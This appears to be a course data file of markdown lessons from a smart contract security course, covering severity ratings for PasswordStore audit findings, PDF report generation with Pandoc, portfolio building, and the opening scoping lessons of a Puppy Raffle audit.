             - a hard-to-change variable is set to a unique value at a specific time.

          > Note: Some situations are _so unlikely_ they're considered `computationally unfeasible` and are not considered valid attack paths.

          ### Wrap Up

          With an understanding of impact and likelihood, we're ready to start applying these methodologies to our PasswordStore audit.

          Take some time before moving on to familiarize yourself with the severity example available on the [**CodeHawks Documentation**](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) before moving forward!
        description: 'Learn how to determine severity ratings for findings in security reviews with the CodeHawks docs as a guide!'
      -
        id: cfca531b-48bb-4b05-ae4f-9873925a2075
        type: new_lesson
        enabled: true
        title: 'Assessing Highs'
        slug: assesing-highs
        duration: 4
        video_url: ukTF1ZbIFTRK2n024mfiuJ015XVpcLuzlWy01GZh9oAq00M
        raw_markdown_url: /routes/security/3-first-audit/25-assesing-highs/+page.md
        markdown_content: |-
          ---
          title: Assessing Highs
          ---

          _Follow along with this video:_

          ---

          ### Assessing Our Severities

          Alright! We're ready to start applying our understanding of `likelihood` and `impact` to the PasswordStore protocol. Let's take a look at our findings.

          ```
          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          ### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          ### [S-#] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect
          ```

          ## Finding #1

          ### [S-#] Storing the password on-chain makes it visible to anyone and no longer private

          <details closed>
          <summary>Impacts and Likelihoods</summary>

          1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.
          2. **Medium Impact**: `funds` are `indirectly at risk` or there‚Äôs `some level of disruption` to the protocol‚Äôs functionality.
          3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.

          ---

          4. **High Likelihood**: Highly probably to happen.
             - a hacker can call a function directly and extract money
          5. **Medium Likelihood**: Might occur under specific conditions.
             - a peculiar ERC20 token is used on the platform.
          6. **Low Likelihood**: Unlikely to occur.
             - a hard-to-change variable is set to a unique value at a specific time.

          </details>

          ---

          Let's consider impacts and likelhoods of our first scenario (I've provided you a reference to them above).

          Upon consideration we see that, while funds aren't at risk, the user's 'hidden' password being visible to anyone is a pretty severe impact to how the protocol is expected to function.

          Because of this, I would argue our assessment of `Impact` should be `High`.

          Now, for likelihood we ask ourselves:

          - `How likely is it that somebody will be able to exploit this?`

          The answer is - _very likely_. There's nothing stopping any malicious actor from acquiring the stored password - it's almost a certainty. `Likelihood` should also be considered `High`.

          ### Likelihood & Impact:

          - Impact: High
          - Likelihood: High
          - Severity: High

          Applying our assessment to our finding title should look like this:

          <img src="/security-section-3/25-assessing-highs/severity1.png" style="width: 100%; height: auto;">

          > Pro-tip: We should try to arrange our findings in our report from High -> Low and from Worst -> Least Offenders

          ## Finding #2

          ### [S-#] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          <details closed>
          <summary>Impacts and Likelihoods</summary>

          1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.
          2. **Medium Impact**: `funds` are `indirectly at risk` or there‚Äôs `some level of disruption` to the protocol‚Äôs functionality.
          3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.

          ---

          4. **High Likelihood**: Highly probably to happen.
             - a hacker can call a function directly and extract money
          5. **Medium Likelihood**: Might occur under specific conditions.
             - a peculiar ERC20 token is used on the platform.
          6. **Low Likelihood**: Unlikely to occur.
             - a hard-to-change variable is set to a unique value at a specific time.

          </details>

          ---

          Considering our second finding, we can tell that anyone being able to set the password at any time is a severe disruption of protocol functionality. A clear `High` `Impact`.

          The `likelihood` is also going to be `High`. Anyone can do this, at any time, the vulnerability is rooted in `access control`.

          ### Likehood & Impact:

          - Impact: High
          - Likelihood: High
          - Severity: High

          The application of this to our second finding's title should leave us with:

          ```
          ### [H-1] Storing the password on-chain makes it visible to anyone and no longer private

          ### [H-2] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          ### [S-#] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect
          ```

          ### Wrap Up

          This is great! We've got one more finding to assess the severity of and this one's a little different as it's `informational`. Let's go over it's `Impact` and `Likelihood` in the next lesson.
        description: 'Audit report severity evaluation using likelihood & impact methodology, demonstrated with examples & steps.'
      -
        id: a7210936-a742-4881-8f6d-96e0d6ff315f
        type: new_lesson
        enabled: true
        title: 'Severity Rating Informational'
        slug: severity-rating-informational
        duration: 3
        video_url: PoNB79RjwrMKqxGwoTpLq8u3jvVsF82btZwus3Ay01cI
        raw_markdown_url: /routes/security/3-first-audit/26-severity-rating-informational/+page.md
        markdown_content: |-
          ---
          title: Severity Rating Assesing Informational/Gas/Non-Crit
          ---

          _Follow along with this video:_

          ---

          ## Finding #3

          ### [S-#] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect

          <details closed>
          <summary>Impacts and Likelihoods</summary>

          1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.
          2. **Medium Impact**: `funds` are `indirectly at risk` or there‚Äôs `some level of disruption` to the protocol‚Äôs functionality.
          3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.

          ---

          4. **High Likelihood**: Highly probably to happen.
             - a hacker can call a function directly and extract money
          5. **Medium Likelihood**: Might occur under specific conditions.
             - a peculiar ERC20 token is used on the platform.
          6. **Low Likelihood**: Unlikely to occur.
             - a hard-to-change variable is set to a unique value at a specific time.

          </details>

          ---

          Just like before, let's ask ourselves things like

          - `Are funds at risk?` - No.
          - `Is this a severe disruption of the protocol?` - No.
          - `Are funds indirectly at risk?` - No
          - `Is there SOME disruption of the protocol?` - Also no.

          It seems already that this finding is going to be pretty low severity, but look at our `Low Impact` criteria (referenced in the dropdown above), we can see that even this doesn't seem to apply.

          What do we do?

          ### Likelihood & Impact

          - Impact: NONE
          - Likelihood: HIGH
          - Severity: Informational/Gas/Non-crit

          In cases like these we would want to inform the protocol that these considerations may not explicitly be bugs but they could include things like

          - Design Pattern Improvements
          - Test Coverage Improvements
          - Documentation Errors
          - Spelling Mistakes

          Anything that isn't a bug, but maybe should be considered anyway to make the code more readable etc - `Informational Severity` (sometimes called 'non-crits') There are also `Gas` severity findings, pertaining to gas optimizations, but we'll go over some of those a little later on.

          This is how our titles look now:

          ```
          ### [H-1] Storing the password on-chain makes it visible to anyone and no longer private

          ### [H-2] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          ### [I-1] The 'PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect
          ```

          ### Wrap Up

          Great work! Our report is looking amazing at this stage. We've consolidated our findings into a document that is clear and concise - outlining all the issues we've spotted. Our findings are well formatted and easy to understand with robust `Proofs of Code`.

          What's next?

          Maybe we missed something .. should we go back and do another pass? Let's go over that frame of mind in the next lesson.
        description: 'Assessing informational severity as a potential issue, unlikely to disrupt code functionality.'
      -
        id: fcd3ebfe-8670-4f09-9bdc-cf7f82bcda3e
        type: new_lesson
        enabled: true
        title: Timeboxing
        slug: timeboxing
        duration: 2
        video_url: P7zwQ61fT529E61VUjAySCR7Y9cHzpI3ugjlKCbTgAc
        raw_markdown_url: /routes/security/3-first-audit/27-timeboxing/+page.md
        markdown_content: |-
          ---
          title: Timeboxing
          ---

          _Follow along with this video:_

          ---

          ### Are we done?

          Now, we've done a lot. You're probably wondering if we should go back and look at the code again. Maybe we missed something...

          Take a moment to consider what you would do in a `live audit` situation. Consider your answer before continuing on.

          <details closed>
          <summary> The Answer </summary>
          <br>
          Maybe.
          <br>
          <br>

          Honestly, we can always look at one more line of code. We can always further scrutinize a repo. At some point however, we have to say "I'm done."

          A lot of time's we're going to be time-boxed in what we do. There will be a limit to the amount of time we can reasonably spend on something. Sometimes this time-boxing is a hard limit we impose on ourselves to assure we remain at our most efficient.

          Often a pressing situation comes down to time management and setting bounds on the time we spend on things.

          We'll go over a few time-boxing strategies a little later as well.

          </details>
        description: 'In this video, Patrick discusses timeboxing in reviewing codebases & moving on when needed. Learn effective time management for security research.'
      -
        id: 8f66bfb6-017a-412a-9c05-48017f67c40b
        type: new_lesson
        enabled: true
        title: 'Making A Pdf'
        slug: making-a-pdf
        duration: 12
        video_url: EyZXPkYslpNZ01jYOiUgHE02CQTHfVlo02UooTEwq3IAxs
        raw_markdown_url: /routes/security/3-first-audit/28-making-a-pdf/+page.md
        markdown_content: |-
          ---
          title: Your First Full Report - Making a PDF
          ---

          _Follow along with this video:_

          ---

          ### First Professional Markdown Report

          This lesson covers how to convert a list of findings into a professional-looking PDF using **Markdown**.

          Our goal is to transform raw data into valuable information by creating a detailed and comprehensive report. Plus, this gives you something impressive to add to your portfolio!

          ## The Basics

          There are some tools and resources you'll need to prepare yourself with before getting started.

          [**GitHub Repo**](https://github.com/Cyfrin/audit-report-templating) - We've created a repo dedicated to assisting security reviewers with generating these reports.

          [**Pandoc**](https://pandoc.org/installing.html) - a universal document converter that we'll be leveraging to generate our PDFs

          [**LaTeX**](https://www.latex-project.org/get/) - a document preparation system for typesetting used in technical and scientific documentation primarily.

          [**Markdown All in One**](https://marketplace.visualstudio.com/items?itemName=yzhang.markdown-all-in-one) - Amazing VS Code extension to get the most our of markdown formatting.

          [**VSCode PDF**](https://marketplace.visualstudio.com/items?itemName=tomoki1207.pdf) - will allow us to preview PDF files within VSCode

          ### Adding LaTex to Pandoc

          Once `Pandoc` has been installed, it should create a folder in your root directory named `.Pandoc`, within is a `templates` folder. We want to navigate there.

          In our provided GitHub Repo, you'll find a specific template file named [`eisvogel.latex`](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). You want to copy this file into your `templates` folder.

          > This `eisvogel.latex` template is what's going to tell `Pandoc` how to format our PDF for us! Challenge yourself to customize this template in future!

          ### Setting Up

          Once `Pandox` and `LaTex` have been installed, create a file named `report.md` in your audit-data folder.

          Within the aforementioned GitHub Repo, you'll find `report-example.md`. Copy this into your newly created file. This will be our template for building our final report.

          ### Adding Your Own Logo

          Lastly, let's add a bit of flare. Find an awesome logo (pdf format) and add it to the audit-data folder as well. Name this file `logo.pdf`.

          ### Filling out report.md

          Inside our `report.md` template, we're going to want to personalize a number of things.

          - **Title:** Name it something that describes your work precisely such as "Network Vulnerability Assessment".
          - **Author:** You!
          - **Date:** Update the audit date.

          Now, let's move to the sections under `===` which you can customize according to your audit:

          - **Prepared by:** You!
          - **Auditors:** You again! If you're working as part of a team, you can list contributors here.
          - **Protocol summary:** Describe the protocol and its workings.
          - **Disclaimer:** Enter your name in the space provided, this is to assure the protocol knows that the report is not a guarantee of bug-free code.
          - **Risk classifications:** Explain the criteria for classifying severities into High, Medium and low.
          - **Audit details:** Include the commit hash that your findings correspond to.
          - **Scope:** Include reference to the exact contracts the review has covered.
            - _Note:_ the `‚îî‚îÄ‚îÄ `, found in the README scope will error when we generate the PDF. Replace this with `#--`.
          - **Audit roles:** The roles of the protocol, these were some of the earliest notes we took!
          - **Executive summary:** Give a brief overview of the assessment process.
          - **Severity and number of issues found:** Summarize the number and severity of issues detailed in the report.
          - **Findings:** This is our breakdown of specific findings uncovered over the course of the audit. Paste the write-ups we've done into the respective severity categories and delete the ones we don't need!

          Our report is now ready to be transformed into a professional looking PDF!

          ### Generating the PDF

          Alright, moment of truth. In your terminal, navigate to your `audit-data` folder. Assuming everything has gone well upto now we should just have to run the command:

          ```bash
          pandoc report.md -o report.pdf --from markdown --template=eisvogel --listings
          ```

          And with a bit of magic, you should see a `report.pdf` file appear in your `audit-data` folder.

          ### Wrap Up

          Wow! Our report looks amazing. It's so professional, any client we provide this to would be impressed. We absolutely should add this to our portfolio to showcase all we've learned. Let's go over that in the next lesson!

          ---

          Ok, this wasn't easy and there are admittedly a tonned of potential pitfalls along the way. I've compiled a few possible errors/scenarios you may run into with some suggestions to troubleshoot them below.

          Errors/Issues:

            1. **My home/root directory doesn't have a `.pandoc` file!**

               - Depending on your operating system, this file may exist elsewhere. If you're using WSL/Linux keep a few things in mind

                 - The file may be hidden - files prepended with `.` are often hidden. You can reveal all files in a directory with the command `ls -a`
                 - The file may be elsewhere - navigate back in directories (`cd ..`) until you reach one that looks like this

                 <img src="/security-section-3/28-making-a-pdf/making-a-pdf1.png" style="width: 75%; height: auto;">

                 ...from here navigate to `usr/share/pandoc/data/templates`. In here you will find existing templates and this is where `eisvogel.latex` should be added.

            2. **VS Code says I'm _unable to write a file to that directory_!**

               - This is related to your user permissions, we can force the file to be created with a sudo command. `sudo touch eisvogel.latex` - this command will create a file named `eisvogel.latex` in your current directory.
                 - You may be prompted to enter your credentials or need to create an admin user.

            3. **VS Code says I'm _unable to write to eisvogel.latex_!**

               - Similarly to above, this is permissions related. The easiest work around I found was through another `sudo` command.
                 ```bash
                 sudo tee eisvogel.latex << 'EOF'
                 [copy LaTex here]
                 EOF
                 ```
               - The LaTex you need to copy is available [**here**](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). Yes, you will be pasting 1068 lines into your terminal - this will overwrite your `eisvogel.latex` file, in your current directory, with that copied data.

            4. **When I run `pandoc report.md -o ... etc` I get _File Not Found_**

               - This seems caused when our LaTex package is missing an important element. The easiest solution is to assure we have the full distribution of the package we're using. For WSL users `sudo apt install texlive-full` will resolve these errors.
                 - Note: `texlive-full` is 5.6GB in size.

            5. **When I run `pandoc report.md -o ... etc` I get _Missing number, treated as zero_**

               - Caused by an error in the LaTex syntax either in your markdown using it, or the template itself. Replace the block of LaTeX at the top of your `report.md` file with the following:

               ```
                \begin{titlepage}
                \centering
                {\Huge\bfseries Protocol Audit Report\par}
                \vspace{2cm}
                \begin{figure}[h]
                \centering
                \includegraphics[width=0.5\textwidth]{logo.pdf}
                \end{figure}
                \vspace{2cm}
                {\Large Version 1.0\par}
                \vspace{1cm}
                {\Large\itshape equious.eth\par}
                \vfill
                {\large \today\par}
                \end{titlepage}
               ```

               This should resolve the error.
        description: 'Generate a professional PDF report from a markdown file!'
      -
        id: d59eead2-453d-446c-b32b-86bcff256f96
        type: new_lesson
        enabled: true
        title: 'Building Your Portfolio'
        slug: building-your-portfolio
        duration: 2
        video_url: 28oC00nqKBGCBI6ItZ9LTxe8VgUxPK02bxgw9YqgRJUlI
        raw_markdown_url: /routes/security/3-first-audit/29-building-your-portfolio/+page.md
        markdown_content: |-
          ---
          title: Building Your Portfolio
          ---

          _Follow along with this video:_

          ---

          ### Building a Portfolio

          Now that we've done all this amazing work, we absolutely need to show it off. The world needs to know what we're capable of.

          ---

          Create a new repository on your GitHub profile. Name it whatever you'd like. I'm going to name mine `updraft-security-portfolio`.

          <img src="../../../../static/security-section-3/29-building-your-portfolio/portfolio1.png" style="width: 75%; height: auto;">

          ---

          Next, select `upload an existing file`.

          <img src="../../../../static/security-section-3/29-building-your-portfolio/portfolio2.png" style="width: 75%; height: auto;">

          Now, rename your report something appropriate. It's important to date your audit reports! I'll name mine `2023-12-19 PasswordStore Audit Report`.

          ---

          Drag and drop your PDF into the available space on GitHub. In VS Code you can `right-click` your PDF and select `Reveal in File Explorer` or `Reveal in Finder` for PC and Mac respectively.

          <img src="../../../../static/security-section-3/29-building-your-portfolio/portfolio3.png" style="width: 75%; height: auto;">

          ---

          Select `Commit Changes` at the bottom, and that's all there is to it! You can add your own README describing the contests of this repo and your security journey. Great work!
        description: 'Creating a GitHub public repo for storing smart contract audit and security journey in PDF format. Build that portfolio and get your name out there!'
      -
        id: 5d5a9e52-697b-4fd3-a2c2-d0a0b9c0c97e
        type: new_lesson
        enabled: true
        title: Exercises
        slug: exercises
        duration: 4
        video_url: IXCGXVL01xRERCplfZDhaObUY2ydD02opBPet01g02DMtos
        raw_markdown_url: /routes/security/3-first-audit/30-exercises/+page.md
        markdown_content: |-
          ---
          title: Exercises
          ---

          _Follow along with this video:_

          ---

          ### Congratulations!

          I sincerely want to congratulate you on making it through your first audit experience. It's a giant leap forward in your journey to beefing up your security skills.

          This codebase was obviously very small, with fairly obvious bugs, the difficulty is going to ramp up from here. Don't worry if you had a hard time spotting these vulnerabilities. So much of successful auditing comes with practice and familiarity.

          By the end of this course, your portfolio will contain not one, but six impressively professional security reviews! The 'Final Boss' audit `Vault Guardians` is going to really test our skills. SO EXCITING.

          Before we conclude section 3, there are 2 exercises I have for you to complete.

          1. **Tweet about your progress**: Publicly acknowledging and sharing your small wins often gives a big motivational boost. Tweet about your experience so far, and don't forget to join the community discussions on platforms like [**Discord**](https://discord.gg/cyfrin) and [**GitHub**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/discussions).
          2. **Sign up for Code Hawks**: Now comes the practical application of what you have learned so far. After completing this task, you will be ready to start performing "competitive audits". Although there are a few more skills for you to learn, you're overwhelmingly ready for this challenge! So, sign up [**here**](https://www.codehawks.com/).

          Section 3 NFT Challenge üëÄ

          [Storage Refresher! (Arb)](https://arbiscan.io/address/0x89edc4c74810bedbd53d7da677eb420dc0154b0b)

          [Storage Refresher! (Sepolia)](https://sepolia.etherscan.io/address/0xa2626be06c11211a44fb6ca324a67ebdbcd30b70)

          ### Take a Break

          Now is a perfect time to take a break (ice cream). Our next security review is a big one. Relax and bask in your accomplishments! Well done!
        description: 'Celebrate progress, join CodeHawks! Rest & prep for bigger challenges ahead.'
      -
        id: 738358c9-f40c-4398-b434-550c0c6e4226
        type: new_lesson
        enabled: true
        title: 'Recap & Congrats'
        slug: 'recap-&-congrats'
        duration: 9
        video_url: dUiPgdeN7ksisuykAP4mpgPxn33jurP2fWIeDoHDCyk
        raw_markdown_url: '/routes/security/3-first-audit/31-recap-&-congrats/+page.md'
        markdown_content: |-
          ---
          title: Recap & Congrats
          ---

          _Follow along with this video:_

          ---

          Let's recap everything we've learnt in this lesson so far - it's been a lot.

          ### Onboarding

          We learnt the importance of thoroughly onboarding a protocol. Often we'll receive audit requests without context or preparation (ie random etherscan links) and it's our job to advise the protocol that these are inappropriate. We should educate them on steps required to be ready for an audit. Think back to our [**minimal-onboarding-questions**](https://github.com/Cyfrin/3-passwordstore-audit/blob/onboarded/minimal-onboarding-questions.md)

          **About the Project** - Summary of the project

          **Setup** - What tools are needed to setup the codebase & test suite?

          **Testing** - How to run tests, how to see test coverage

          **Scope** - Specific details of the security review, which contracts are to be audited, the specific commit hash being reviewed

          **Compatibilities** - Chains for deployment, compatible tokens, solc versions

          **Roles** - What are the different actors of the system? What are their powers meant to be?

          **Known Issues** - Any issues the protocol is aware of already.

          ### Codebase Size

          Another thing we covered was how to determine a codebase's size and complexity using tools like [**Solidity Metrics**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-metrics) and [**CLOC**](https://github.com/AlDanial/cloc).

          These tools allow us to count lines of code, estimate complexity and - in the case of Solidity Metrics - see breakdowns of how the protocol interconnects and which functions are visible.

          These tools are primarily valuable in that they allow us the ability to estimate a work load or timeframe required for a thorough audit.

          ### The phases of an audit

          We covered the phases of an audit and each steps within.

          - Initial Review
            - Scoping - This is getting a sense of the protocol. In this phase, auditors go through the code to scope it. This gives an idea of how much time might be required for the audit, which can then be used to establish pricing. Key tasks include identification of all the contract‚Äôs dependencies and a general overview of the code. At this stage, auditors don‚Äôt dig deep into anything yet.
            - Reconnaissance - Here an auditor starts walking through the code, running tools, interacting with the protocol in an effort to break it.
            - Vulnerability Identification - An auditor determines which vulnerabilities are present and how they're exploited as well as mitigation.
            - Reporting - Compile a report detailing all of the identified vulnerabilities and recommendations to make the protocol more secure.
            ***
          - Protocol Fixes
            - Fixes Issues
            - Retests and adds tests
          - Mitigation Review
            - Reconnaissance
            - Vulnerability Identification
            - Reporting

          ### The Tincho

          The legendary Tincho from [**The Red Guild**](https://blog.theredguild.org/) blessed us with his wisdom and experience, outlining the approach he takes while peforming a security review. He stresses:

          - Read the docs
          - Take notes often - right in the codebase
          - Small > Large - start on the easiest contracts and advance into more complex ones
          - Leverage tools like [**Solidity Metrics**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-metrics) to breakdown a hierarchy of complexity/size within a codebase

          ### First Security Review

          We performed our first security review of the PasswordStore protocol!

          Applying the steps of a security review we were able to uncover 3 vulnerabilities within the protocol:

          ---

          [H-1] `PasswordStore::setPassword` has no access controls, meaning a non-owner could change the password

          [H-2] Storing the password on-chain makes it visible to anyone and no longer private

          [I-1]The `PasswordStore::getPassword` natspec indicates a parameter that doesn't exist, causing the natspec to be incorrect.

          ---

          We also learnt how to classify the severities of our findings! Remember the matrix:

          |            |        | Impact |        |     |
          | ---------- | ------ | ------ | ------ | --- |
          |            |        | High   | Medium | Low |
          |            | High   | H      | H/M    | M   |
          | Likelihood | Medium | H/M    | M      | M/L |
          |            | Low    | M      | M/L    | L   |

          1. **High Impact**: `funds` are directly or nearly `directly at risk`, or a `severe disruption` of protocol functionality or availability occurs.
          2. **Medium Impact**: `funds` are `indirectly at risk` or there‚Äôs `some level of disruption` to the protocol‚Äôs functionality.
          3. **Low Impact**: `Fund are not at risk`, but a function might be incorrect, or a state handled improperly etc.

          ---

          1. **High Likelihood**: Highly probably to happen.
             - a hacker can call a function directly and extract money
          2. **Medium Likelihood**: Might occur under specific conditions.
             - a peculiar ERC20 token is used on the platform.
          3. **Low Likelihood**: Unlikely to occur.
             - a hard-to-change variable is set to a unique value at a specific time.

          ### Creating Findings Reports

          We covered how to turn those findings into a professional breakdown using this template:

          ---

          ```
          ### [S-#] TITLE (Root Cause + Impact)

          **Description:** - Succinctly detail the vulnerability

          **Impact:** - The affects the vulnerability has

          **Proof of Concept:** - Programmatic proof of how the vulnerability is exploited

          **Recommended Mitigation:** Recommendations on how to fix the vulnerability
          ```

          ---

          ### Timeboxing

          We briefly covered the importance of timeboxing. We'll always be able to further scrutinize a codebase - time management and constraining our time investments is how we become efficient security reviewers.

          ### Professional PDF Report

          And finally, we walked through the steps needed to create a beautiful PDF report using our [**audit-report-templating**](https://github.com/Cyfrin/audit-report-templating) repo.

          Leveraging new tools like [**Pandoc**](https://pandoc.org/installing.html) and [**LaTex**](https://www.latex-project.org/) we were able to convert our markdown report into a presentable PDF that we're now proudly displaying on our own GitHub Security Reviewer portfolio.

          ### Wrap Up

          Wooooow. That's a lot when you put it all together like that. You should be incredibly proud of your progress so far. Take a break, stretch your legs, tweet your successes and then come back.

          The next security review is going to be _SICK_.
        description: 'Patrick recaps your first security review steps: onboarding, docs, scope, vulnerabilities, mitigation and reporting'
    type: new_section
    enabled: true
  -
    id: EZ0EgzW1
    title: 'Puppy raffle'
    slug: puppy-raffle
    lessons:
      -
        id: 9b46fac7-d345-4a64-afa2-54f6f7c2c8fe
        type: new_lesson
        enabled: true
        title: Introduction
        slug: introduction
        duration: 5
        video_url: 02Yjab00x9Nd01Dn5e1Z3oWthPxq91ihNv5uHIASObiJF00
        raw_markdown_url: /routes/security/4-puppy-raffle/1-introduction/+page.md
        markdown_content: |-
          ---
          title: Introduction
          ---

          _Follow along with this video:_

          ---

          ## Puppy Raffle Audit

          Welcome to Section 4: Puppy Raffle Audit! In addition to strengthening our skills in manual review, in this section we'll be introducing powerful tools and leveraging `static analysis` to help us secure this protocol.

          We'll see the differences between a private audit report and a competitive audit submission and be introduced to the process of competing in a CodeHawks First Flight!

          ### CodeHawks First Flights

          CodeHawks First Flights offer an excellent platform for budding smart contract security researchers. This platform contains relatively easy-to-understand codebases that resemble those you will find in this course.

          If you are a beginner, they are a perfect opportunity to get live auditing experience and build upon the things you've learnt in a practical setting. For experienced auditors, they serve as a chance to engage in the community and itterate on your established skills.

          <img src="/security-section-4/1-introduction/introduction1.png" style="width: 100%; height: auto;">

          We'll be going over how to submit an awesome competitive finding in this section.

          ### Tooling

          As mentioned above, we'll be using new tools to help us in finding vulnerabilities and familiarizing ourselves with `static analysis`. We'll be using:

          - [**Slither**](https://github.com/crytic/slither) - A pythonic static analysis tool compatible with Solidity and Vyper
          - [**Aderyn**](https://github.com/Cyfrin/aderyn) - Built in Rust by _Alex Roan_, Aderyn traverses Abstract Syntax Trees to highlight suspected vulnerabilities.

          Through this section, you will:

          - Familiarize yourself with your first set of tooling.
          - Understand what static analysis is and its role in enhancing protocol security.
          - Gain an insight into the different exploits in this codebase.
          - Finally, learn how to write reports of competitive audits and differentiate them from private audits.

          ### So Many Bugs

          Our previous codebase was quite small, Puppy Raffle has more to it and as a result, there are many more bugs to find! There are at least FOUR HIGHs to find in this repo (and likely some I didn't even account for üòã).

          ### Case Studies

          As we uncover vulnerabilities in the Puppy Raffle codebase, we'll dive into real world case studies detailing times these vulnerabilities were exploited in the wild.

          This should give you real insight into what's at stake as we're performing security reviews and really instill that these efforts of ours matter.

          ### Exercises

          At the end of the section we'll have _even more_ excercises for you to expand on your knowledge and challenge yourself beyond the course's teachings. These are your opportunities to branch out, network and gain additional experience.

          This includes participating in a CodeHawks First Flight or a competitive audit! Get ready!

          ### Prep for Puppy Raffle

          If you take a look at the [**repo**](https://github.com/Cyfrin/4-puppy-raffle-audit) associated with this section, you'll see a fairly robust README already supplied. For this review, we're assuming the protocol has already undergone some degreee of onboarding and they've provided us a respectable repo.

          I will transparently point out that, much like our previous protocol review, this repo has multiple branches, one of which is the `audit-data` branch. I **STRONGLY** encourage you to resist peeking in this branch until the end. The `audit-data` branch effectively serves as an `answer key`, in which all the vulnerabilities and write-ups can be found.

          Going through the codebase throughout the course, and appreciating each step is how you're going to build these skills. Uncovering the attack vectors is how you build familiarity with these risks. Skipping over steps is only going to harm your progress. Build the habits, do the work.
        description: 'An introduction to PuppyRaffle and all else that will be covered in this section!'
      -
        id: 0af77dc7-3aa4-4ba0-9d07-2cf85bacea1c
        type: new_lesson
        enabled: true
        title: 'Puppy raffle primer'
        slug: puppy-raffle-primer
        duration: 2
        video_url: QrZX01ONG5oJ1ciOXhw1B2G88pF9BWB5IP3FIw8pgQAw
        raw_markdown_url: /routes/security/4-puppy-raffle/2-puppy-raffle-primer/+page.md
        markdown_content: |-
          ---
          title: Puppy Raffle Primer
          ---

          _Follow along with this video:_

          ---

          ### Puppy Raffle Primer

          Alright! Before we jump into this process I want to mention a couple things:

          1. Do **not** look at the `audit-data` branch of the course [**repo.**](https://github.com/Cyfrin/4-puppy-raffle-audit). This is our `answer key`.

          2. Take some time to scope the codebase yourself before proceeding. Try to go through the process we just did with PasswordStore and challenge yourself to find what you can here.

          Don't spend _too much_ time trying things yourself. Spend 20-30 minutes doing your best and if you feel like you're getting nowhere, or you're unsure what to do - just stop. We can do it together.

          If you feel like you're cooking and you've found a few bugs - keep going. Repeating this process and becoming comfortable with doing it yourself is an important part of learning.

          Puppy Raffle is a phenomenal codebase to gain valuable security review experience on. So try your best on your own first, and when you're ready - let's move onto the Scoping phase together!
        description: 'Learn coding bug detection in this mock audit! Explore, discover & review together.'
      -
        id: 2951f741-904b-4b98-a3fc-91cd1c5fd334
        type: new_lesson
        enabled: true
        title: 'Phase 1: Scoping'
        slug: phase-1-scoping
        duration: 4
        video_url: QXA0077rZrBDjU3JlIMEJJPM45AyU12RjdL1Y4sUax02g
        raw_markdown_url: /routes/security/4-puppy-raffle/3-phase-1-scoping/+page.md
        markdown_content: |-
          ---
          title: Phase 1 - Scoping
          ---

          _Follow along with this video:_

          ---

          ### Puppy Raffle Scoping

          Now that you've **definitely** tried reviewing the codebase on your own, let's start scoping things out together.

          Take a look at the [**Puppy Raffle Repo**](https://github.com/Cyfrin/4-puppy-raffle-audit)'s README

          <img src="static/security-section-4/3-phase-1-scoping/phase-1-scoping1.png" style="width: 50%; height: auto;">

          ### README Overview

          This README looks pretty good. We've got all the expected sections and necessary details.

          Remember the things we're looking for:

          - **About**
          - **Setup**
          - **Scope**
          - **Compatibilities**
          - **Roles**
          - **Known Issues**

          We should see clear instructions under [**Getting Started**](https://github.com/Cyfrin/4-puppy-raffle-audit#getting-started) on how to get set up locally.

          ```bash
          git clone https://github.com/Cyfrin/4-puppy-raffle-audit.git
          cd 4-puppy-raffle-audit.git
          make
          ```

          > Take a brief look at your `Makefile`. It's worthwhile to appreciate what it's actually doing. Our `Makefile` cleans our repo, installs necessary packages (Foundry, OpenZeppelin and base64) and then runs `forge build` to compile everything.

          ### Testing

          Once we've run our `make` command, we should check out the protocol tests. I like to start by running `forge coverage` to see what kind of baseline we're starting with.

          <img src="/security-section-4/3-phase-1-scoping/phase-1-scoping2.png" style="width: 50%; height: auto;">

          Thing's don't look great.

          From a competitive audit point of view, this might be exciting, there are lots of opportunities for bugs to be hiding in this codebase.

          If we were doing a private audit, we're less optimistic. Poor test coverage is indicative of an immature codebase and we're responsible for securing this protocol!

          ### README Continued

          Further down the README we see the scope details. Invaluable information.

          By using the command `git checkout <commitHash>` we can assure our local repo is the correct version to be auditing.

          We also see exactly which contracts are under review.

              ./src/
              ‚îî‚îÄ‚îÄ PuppyRaffle.sol

          Moving on, we should take notice of the **Compatibilities** section.

          <img src="/security-section-4/3-phase-1-scoping/phase-1-scoping3.png" style="width: 50%; height: auto;">

          That Solc version is strange - definitely make note of it.

          Finally, they've also outlined the Roles of the protocol for us. Knowing this intended functionality is important in being able to spot when things go wrong.

          - Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.
          - Player - Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through refund function.

          There are no _known_ issues. Hehe.

          ### Wrap Up

          Things are looking great so far, the protocol has provided us with lots of documentation to get started with. We've even spotted an oddity already.

          In the next lesson we'll begin using our tools to spot vulnerabilities before we even start.
        description: 'Puppy Raffle Code Base, Git & Foundry Installation, Testing Coverage, Security View, Exploits.'
      -
        id: d6c942d9-d7fb-4b1b-a29b-14e55b2a8f6e
        type: new_lesson
        enabled: true
        title: 'Tooling: Slither'
        slug: tooling-slither
        duration: 6
